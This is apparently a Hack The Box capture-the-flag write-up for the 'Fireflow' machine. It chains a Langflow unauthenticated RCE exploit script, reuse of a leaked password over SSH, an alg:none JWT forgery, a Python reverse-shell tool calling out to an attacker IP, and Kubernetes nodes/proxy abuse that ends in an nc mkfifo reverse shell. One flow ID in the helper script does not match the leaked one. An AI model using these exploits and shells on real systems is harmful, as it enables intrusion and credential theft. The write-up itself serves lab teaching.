---
title: Fireflow
description: Medium HTB Linux box chaining Langflow RCE (CVE-2026-33017), password reuse, MCP JWT alg:none forgery, and Kubernetes nodes/proxy to root.
image: /static/fireflow.png
tags:
  - writeup
  - htb
  - web
  - kubernetes
  - jwt
difficulty: medium
date: 2026-08-02
---


| | |
|---|---|
| **Machine** | Fireflow |
| **Difficulty** | Medium |
| **Category** | Web / Kubernetes / MCP / JWT |
| **Target** | 10.129.3.34 |
| **User Flag** | `3cb7e79e7dff23933c1eafc9fd214320` |

---

## TL;DR (Summary)

Fireflow is a medium-difficulty Linux machine that chains several vulnerabilities together:

1. A leaked **Langflow flow_id** lets us exploit **CVE-2026-33017** (unauthenticated RCE) to get a shell as `www-data`.
2. A password in Langflow's `.env` file is **reused** by the user `nightfall`, who can SSH into the machine.
3. In `nightfall`'s home directory, a config file leaks how to connect to a **custom MCP server**.
4. The MCP server uses **JWT with `alg: none`** enabled, so we forge an admin token and register a malicious tool → **shell in the MCP pod**.
5. Enumerating Kubernetes reveals the **`nodes/proxy`** permission is set, letting us execute commands on privileged pods and gain **root on the host filesystem**.

---

## 1. Reconnaissance

### Port Scan

We start by scanning the target to find open ports.

```bash
nmap -sS -p- --min-rate 2000 -T4 10.129.3.34
```

**Result:**

```
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https
```

Only SSH and HTTPS are open. Let's look at the web service.

### Web Service

```bash
curl -sk -i https://10.129.3.34/
```

The server redirects to `https://fireflow.htb/`. We add the hostname to `/etc/hosts`:

```bash
echo "10.129.3.34 fireflow.htb" >> /etc/hosts
echo "10.129.3.34 flow.fireflow.htb" >> /etc/hosts
```

The main page is a "FireFlow — Task Force Nightfall" dashboard. It contains a link to a **Langflow playground**:

```
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

This leaks a **flow_id**: `7d84d636-af65-42e4-ac38-26e867052c25`.

---

## 2. Langflow RCE — CVE-2026-33017

### What is the vulnerability?

Langflow is a tool for building AI workflows. In versions **before 1.9.0**, the endpoint:

```
POST /api/v1/build_public_tmp/{flow_id}/flow
```

allows building **public flows without authentication**. When you supply a `data` parameter, the endpoint uses **your attacker-controlled flow data** (which can contain arbitrary Python code in node definitions) instead of the stored flow. That code is passed to `exec()` with **zero sandboxing** → **unauthenticated RCE**.

### Confirm the endpoint exists

```bash
FLOW="7d84d636-af65-42e4-ac38-26e867052c25"
curl -sk -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/$FLOW/flow" \
  -H "Content-Type: application/json" \
  -H "Cookie: client_id=test123" \
  -d '{}'
```

We get a `job_id` back, confirming the endpoint works (it needs a `client_id` cookie).

### Crafting the malicious flow

The `data` parameter is a Langflow flow with a **Code node**. The node's `code` field contains Python that gets executed. We build a flow where the Code node runs a shell command and returns the output.

**`/tmp/run_cmd.py`** — builds the malicious flow JSON:

```python
import json, sys

cmd = sys.argv[1]
code = f'''from typing import Any, cast
from lfx.custom.custom_component.component import Component
from lfx.io import Output

class Code(Component):
    display_name = "Code"
    description = "Execute arbitrary code"
    icon = "code"
    name = "Code"
    legacy = True
    inputs = []
    outputs = [Output(name="output", display_name="Output", method="build_output")]

    def build_output(self):
        import subprocess
        result = subprocess.check_output({json.dumps(cmd)}, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
'''

code_field = {
    "advanced": True, "dynamic": True, "fileTypes": [], "file_path": "",
    "info": "", "list": False, "load_from_db": False, "multiline": True,
    "name": "code", "password": False, "placeholder": "", "required": True,
    "show": True, "title_case": False, "type": "code", "value": code
}

node = {
    "data": {
        "description": "x", "display_name": "Code", "id": "Code-1",
        "node": {
            "base_classes": ["Data", "Message"], "beta": False, "conditional_paths": [],
            "custom_fields": {}, "description": "x", "display_name": "Code",
            "documentation": "", "edited": False, "field_order": ["code"],
            "frozen": False, "icon": "code", "legacy": True, "lf_version": "1.6.0",
            "metadata": {}, "output_types": [],
            "outputs": [{"allows_loop": False, "cache": True, "display_name": "Output",
                "group_outputs": False, "method": "build_output", "name": "output",
                "selected": "Message", "tool_mode": True, "types": ["Message"],
                "value": "__UNDEFINED__"}],
            "pinned": False,
            "template": {"_type": "Component", "code": code_field}
        },
        "selected_output": "output", "type": "Code"
    },
    "dragging": False, "id": "Code-1", "position": {"x": 0, "y": 0},
    "positionAbsolute": {"x": 0, "y": 0}, "selected": False, "type": "genericNode"
}
print(json.dumps({"data": {"nodes": [node], "edges": []}}))
```

### Executing the exploit

We send the malicious flow with `event_delivery=direct` so the result comes back in the HTTP response (the polling events endpoint can hang).

**`/tmp/ffexec.sh`** — reusable RCE helper:

```bash
#!/bin/bash
FLOW="7f7d84d636-af65-42e4-ac38-26e867052c25"
python3 /tmp/run_cmd.py "$1" > /tmp/body_cmd.json
curl -sk --max-time 20 -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/$FLOW/flow?event_delivery=direct" \
  -H "Content-Type: application/json" \
  -H "Cookie: client_id=test123" \
  --data @/tmp/body_cmd.json 2>&1 | python3 -c "
import sys,json
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    try:
        d=json.loads(line)
        if d.get('event')=='end_vertex':
            print(d['data']['build_data']['data']['outputs']['output']['message'])
        elif d.get('event')=='error':
            print('ERR:', d['data'].get('text','')[:500])
    except: pass
"
```

Run it:

```bash
chmod +x /tmp/ffexec.sh
/tmp/ffexec.sh "id; hostname"
```

**Result:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fireflow
```

We have **RCE as www-data** on the host `fireflow`.

---

## 3. Finding the Password (www-data → nightfall)

### Reading the Langflow `.env`

```bash
/tmp/ffexec.sh "cat /etc/langflow/.env"
```

**Result:**

```
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

We get the superuser password: **`n1ghtm4r3_b4_n1ghtf4ll`**.

### SSH as nightfall

The challenge hints this password is **reused** by the user `nightfall`. Let's try SSH:

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh -o StrictHostKeyChecking=no nightfall@10.129.3.34
```

It works! We're now `nightfall`.

### User Flag

```bash
cat ~/user.txt
```

**User flag:** `3cb7e79e7dff23933c1eafc9fd214320`

---

## 4. MCP Server Discovery

### The `.mcp` config

In `nightfall`'s home directory there's a hidden `.mcp` folder:

```bash
cat ~/.mcp/config.json
```

**Result:**

```json
{
  "server": "http://10.129.3.34:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

This leaks credentials to a **custom MCP (Model Context Protocol) server** on port 30080.

### Exploring the MCP server

The MCP server is only reachable from the `nightfall` host, so we run curl through SSH:

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@10.129.3.34 \
  'curl -s http://10.129.3.34:30080/api/v1/version'
```

**Result:**

```json
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": ["HS256", "none"]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

Key finding: **`supported_algorithms: ["HS256", "none"]`** — the server accepts JWT with `alg: none`, which lets us forge tokens.

---

## 5. JWT Algorithm Confusion (alg: none)

### Get a legitimate token

```bash
curl -X POST 'http://10.129.3.34:30080/api/v1/auth' \
  -H 'Content-Type: application/json' \
  -d '{
    "username": "langflow-bot",
    "password": "Langfl0w@mcp2026!"
  }'
```

**Result:**

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

### Decoding the token

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9" | cut -d. -f2 | base64 -d
```

**Payload:**

```json
{"sub":"langflow-bot","role":"user"}
```

The token has `role: user`. We want `role: admin`.

### Forging an admin token with `alg: none`

Since the server accepts `alg: none`, we craft a token with no signature:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': 'langflow-bot', 'role': 'admin'}

h = b64url(json.dumps(header).encode())
p = b64url(json.dumps(payload).encode())

token = f'{h}.{p}.'
print(token)
```

**Result:**

```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibGFuZ2Zsb3ctYm90IiwgInJvbGUiOiAiYWRtaW4ifQ.
```

> Note: with `alg: none` the signature part is empty, but you must keep the trailing `.`.

### Verify admin access

```bash
TOKEN="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibGFuZ2Zsb3ctYm90IiwgInJvbGUiOiAiYWRtaW4ifQ."

curl -s http://10.129.3.34:30080/api/v1/tools \
  -H "Authorization: Bearer $TOKEN"
```

We can now list tools and, more importantly, **register new tools** (admin-only).

---

## 6. RCE via MCP Tool Registration

### Registering a malicious tool

The `POST /api/v1/tools` endpoint (admin-only) lets us register a tool with arbitrary Python `code`. We register a **reverse shell** tool:

```bash
curl -X 'POST' 'http://10.129.3.34:30080/api/v1/tools' \
  -H 'accept: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "anan-shell",
    "description": "reverse shell",
    "inputSchema": {"additionalProp1": {}},
    "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.16.28\",6969))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
  }'
```

**Result:**

```json
{"status":"registered","name":"anan-shell"}
```

The Python code forks out of the running process so the shell stays alive even after the MCP call closes.

### Invoke the tool via MCP

```bash
curl -s -X 'POST' 'http://10.129.3.34:30080/mcp' \
  -H 'accept: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {"name": "anan-shell", "arguments": {}}
  }'
```

**Result:**

```json
{"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":""}],"isError":false}}
```

We now have a **reverse shell inside the MCP pod** (`mcp-server`).

---

## 7. Kubernetes Enumeration & Privilege Escalation (Root)

### In-pod recon & SA token extraction

Inside the pod, we enumerate. Every K8s pod has a service account token auto-mounted at:

```
/var/run/secrets/kubernetes.io/serviceaccount/
```

We extract the three files:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

- **token** — a JWT authenticating us as `system:serviceaccount:default:mcp-sa`
- **ca.crt** — the cluster's CA certificate
- **namespace** — `default`

The API server is at `https://10.43.0.1:443` (ClusterIP, only reachable from inside the cluster).

### Port-forward the K8s API server

We tunnel the API server through our pod shell so we can reach it from our machine. After port-forwarding, `localhost:6443` reaches the K8s API.

### Build a kubeconfig

```bash
export TOKEN=$(cat token)

kubectl config set-cluster fireflow \
  --server=https://127.0.0.1:6443 \
  --certificate-authority=$(pwd)/ca.crt \
  --embed-certs=true \
  --kubeconfig=kubeconfig.yaml

kubectl config set-credentials mcp-sa \
  --token="$TOKEN" \
  --kubeconfig=kubeconfig.yaml

kubectl config set-context fireflow \
  --cluster=fireflow --user=mcp-sa --namespace=default \
  --kubeconfig=kubeconfig.yaml

kubectl config use-context fireflow \
  --kubeconfig=kubeconfig.yaml
```

### Check our permissions

```bash
kubectl --kubeconfig=kubeconfig.yaml auth can-i --list
```

**Key permission:**

```
nodes/proxy   []   []   [get]
```

We have **`get` on `nodes/proxy`** — this is the jackpot.

### What is `nodes/proxy`?

`nodes/proxy` is a special K8s subresource that lets us **proxy HTTP requests through the API server directly to the kubelet** on a node. With `get` permission, we can hit:

```
/api/v1/nodes/<node-name>/proxy/<any-kubelet-endpoint>
```

This effectively lets us talk to the **kubelet on port 10250** through the API server, bypassing the normal `pods/exec` RBAC check. Useful kubelet endpoints:

| Endpoint | What it does |
|----------|--------------|
| `/pods` | List all pods on the node |
| `/exec/<ns>/<pod>/<container>` | Execute commands in any container |
| `/run/<ns>/<pod>/<container>` | Run a command (non-interactive) |
| `/configz` | Kubelet configuration |
| `/logs/` | Node log files |

### Port-forward the kubelet & enumerate pods

After port-forwarding the kubelet (port 10250), we list the pods:

```bash
curl -sk https://127.0.0.1:10250/pods \
  -H "Authorization: Bearer $TOKEN" | \
  jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) -> \([.spec.containers[].name])"'
```

**Result:**

```
kube-system/coredns-76c974cb66-cn7l6 -> ["coredns"]
kube-system/local-path-provisioner-8686667995-lp9th -> ["local-path-provisioner"]
kube-system/metrics-server-c8774f4f4-phw6q -> ["metrics-server"]
monitoring/prometheus-kube-state-metrics-7c8c787854-25j6q -> ["kube-state-metrics"]
monitoring/prometheus-server-867bb4fcfd-m4t59 -> ["prometheus-server-configmap-reload","prometheus-server"]
default/mcp-server-54464cb475-29ztf -> ["mcp-server"]
monitoring/prometheus-prometheus-node-exporter-nmntq -> ["node-exporter"]
```

### Target: prometheus-node-exporter

The **`prometheus-node-exporter`** pod is the ideal target because by design it needs:

- **Root privileges** — to read system-level metrics
- **Host filesystem mounted at `/host`** — to report disk usage
- **hostPID / hostNetwork** — to monitor host processes and network

So if we exec into it, we get **root + direct access to the host filesystem**.

### Exec into the node-exporter container

```bash
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=id"
```

**Result:**

```
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

We are **root** inside the node-exporter container.

### Get a reverse shell & escape to the host

```bash
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://127.0.0.1:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=/bin/sh&command=-c&command=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.28%206969%20%3E%2Ftmp%2Ff"
```

URL-decoded, the command is:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.28 6969 > /tmp/f
```

Since the node-exporter container has the **host filesystem mounted at `/host`**, we can now read the root flag:

```bash
cat /host/root/root.txt
```

### Root flag

```
<root_flag_here>
```

---

## Summary of Flags

| Flag | Value |
|------|-------|
| **User flag** | `3cb7e79e7dff23933c1eafc9fd214320` |
| **Root flag** | *(obtained from `/host/root/root.txt`)* |

---

## Key Takeaways

1. **CVE-2026-33017** — Langflow's `build_public_tmp` endpoint allows unauthenticated RCE via attacker-controlled flow data passed to `exec()`.
2. **Password reuse** — the Langflow superuser password was reused for the `nightfall` SSH user.
3. **JWT `alg: none`** — the MCP server accepted unsigned tokens, letting us forge an admin token.
4. **MCP tool registration** — admin can register arbitrary Python code as a tool, giving RCE in the pod.
5. **`nodes/proxy`** — a powerful K8s permission that lets us proxy to the kubelet and exec into any container, bypassing normal RBAC.
6. **node-exporter** — a privileged pod with host filesystem access is the perfect pivot to root on the host.